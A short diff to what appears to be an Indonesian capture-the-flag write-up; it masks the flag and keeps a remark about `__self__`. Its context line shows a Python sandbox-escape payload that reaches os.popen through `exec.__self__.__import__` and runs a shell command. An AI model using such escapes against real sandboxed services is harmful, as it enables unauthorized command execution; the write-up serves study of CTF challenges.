@@ -52,6 +52,7 @@ exec.__self__.__import__("os").popen("cat flag.txt").read()
 ```
 dengan output:
 ```
-TCP1P{using_another_functon__self__to_get__import__}
+TCP1P{******************************_get__import__}
 ```
+note:* hanya untuk menutupi full flag
 opini: menurut saya gunanya `__self__` adalah untuk meng-akses class yang ada di dalam scope mirip penggunaan `this` dalam javascript
